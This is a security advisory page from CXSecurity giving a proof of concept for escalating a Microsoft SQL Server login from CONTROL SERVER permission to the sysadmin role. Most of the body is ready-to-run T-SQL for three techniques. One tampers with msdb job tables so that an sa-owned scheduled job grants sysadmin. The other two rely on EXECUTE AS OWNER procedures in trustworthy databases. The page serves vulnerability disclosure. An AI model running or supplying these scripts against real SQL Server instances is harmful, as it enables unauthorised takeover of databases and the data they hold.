---
title: Microsoft SQL Server Privilege Escalation from Control Server To Sysadmin role
url: https://cxsecurity.com/issue/WLB-2025050043
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-23
fetch_date: 2025-10-06T22:26:39.877482
---

# Microsoft SQL Server Privilege Escalation from Control Server To Sysadmin role

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft SQL Server Privilege Escalation from Control Server To Sysadmin role** **2025.05.22**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Title: Microsoft SQL Server Privilege Escalation from Control Server To Sysadmin role
Product: Microsoft SQL Server
Affected Version(s): sql server 2016,2017,2019,2022
Risk Level: Medium
Author of Advisory: Emad Al-Mousa
Overview:
Privilege escalation is one of the most common exploit techniques hackers use to abuse and take over critical systems, database systems are very important to be protected against
such attacks.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Exploit Summary Details:
3 novel techniques exploits can be used to abuse control server permission in SQL Server to escalate/elevate to SYSADMIN role. control server permission is powerful permission yet not at
the same level of SYSADMIN role.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
Exploit Technique 1: Direct Modification into MSDB database tables
As an account with CONTROL SERVER ROLE….you can add the login as database user at MSDB level but can’t grant any database role directly to it:
USE [msdb]
GO
CREATE USER [rico] FOR LOGIN [rico]
GO
After database user account creation successfully completed, I will try to add it to db\_owner role:
USE [msdb]
GO
ALTER ROLE [db\_owner] ADD MEMBER [rico]
GO
The following error will be thrown:
Msg 15151, Level 16, State 1, Line 3
Cannot alter the role ‘db\_owner’, because it does not exist or you do not have permission.
However I still can elevate to SYSADMIN Role through direct system tables modification in MSDB database:
For the sake of a proof of concept I will create a dummy job in SQL Server Instance and call it “Test” using the below code:
USE [msdb]
GO
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]’ AND category\_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp\_add\_category @class=N’JOB’, @type=N’LOCAL’, @name=N'[Uncategorized (Local)]’
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
END
DECLARE @jobId BINARY(16)
EXEC @ReturnCode = msdb.dbo.sp\_add\_job @job\_name=N’Test’,
@enabled=1,
@notify\_level\_eventlog=0,
@notify\_level\_email=0,
@notify\_level\_netsend=0,
@notify\_level\_page=0,
@delete\_level=0,
@description=N’No description available.’,
@category\_name=N'[Uncategorized (Local)]’,
@owner\_login\_name=N’sa’, @job\_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp\_add\_jobstep @job\_id=@jobId, @step\_name=N’elevate\_me’,
@step\_id=1,
@cmdexec\_success\_code=0,
@on\_success\_action=1,
@on\_success\_step\_id=0,
@on\_fail\_action=2,
@on\_fail\_step\_id=0,
@retry\_attempts=0,
@retry\_interval=0,
@os\_run\_priority=0, @subsystem=N’TSQL’,
@command=N’XXXXXXXXXXXXXXXXXXXXXX’,
@database\_name=N’master’,
@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp\_update\_job @job\_id = @jobId, @start\_step\_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp\_add\_jobschedule @job\_id=@jobId, @name=N’run’,
@enabled=1,
@freq\_type=4,
@freq\_interval=1,
@freq\_subday\_type=2,
@freq\_subday\_interval=10,
@freq\_relative\_interval=0,
@freq\_recurrence\_factor=0,
@active\_start\_date=20231015,
@active\_end\_date=99991231,
@active\_start\_time=0,
@active\_end\_time=235959,
@schedule\_uid=N’6986b644-3356-4750-a140-00193274d23d’
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp\_add\_jobserver @job\_id = @jobId, @server\_name = N'(local)’
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:
GO
// I will be able to query the list of Jobs
select \* from [msdb].[dbo].[sysjobs];
//I will change the ownership of the job Test to be “sa” account using the below update statement
update [msdb].[dbo].[sysjobs] set owner\_sid=0x01 where name='Test';
// I will retrieve information about job Test using job\_id value
SELECT \* FROM [msdb].[dbo].[sysjobsteps] where job\_id=’A4592896-4688-4DCC-B63E-813BE71A7EDD’;
// I will update the code of the job step to elevate/escalate permission
update [msdb].[dbo].[sysjobsteps] set command='ALTER SERVER ROLE [sysadmin] ADD MEMBER [rico] ' where job\_id='29027CCB-EA4E-4ADA-B175-F2BF534FE30E';
And that’s it….account “rico” will be escalated to SYSADMIN role in the next scheduled time for the job “Test”.
Exploit Technique 2: Code Injection In MSDB database to exploit trustworthy property
USE [msdb]
GO
CREATE USER [rico] FOR LOGIN [rico]
GO
USE [msdb]
GO
create or alter procedure dbo.elevate\_me
with execute as owner
as alter server role sysadmin add member rico;
GO
USE [msdb]
GO
exec dbo.elevate\_me;
And that’s it[refresh your connection]…database login rico is now elevated from CONTROL SERVER to SYSADMIN role.
Exploit Technique 3: DB Creation with Trustworthy Property
As login rico I will create a database and set trustworthy of the database to “on” and add the login as database user to escalate to sysadmin role as it will be presented here:
create database TEST55;
ALTER DATABASE TEST55 SET TRUSTWORTHY ON;
USE [TEST55]
GO
ALTER AUTHORIZATION ON DATABASE::[TEST55] TO [sa]
GO
USE [TEST55]
GO
CREATE USER [rico] FOR LOGIN [rico]
GO
USE [TEST55]
GO
create or alter procedure dbo.elevate\_me
with execute as owner
as alter server role sysadmin add member rico;
GO
USE [TEST55]
GO
exec dbo.elevate\_me;
And that’s it…database login rico is now elevated from CONTROL SERVER to SYSADMIN role.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\...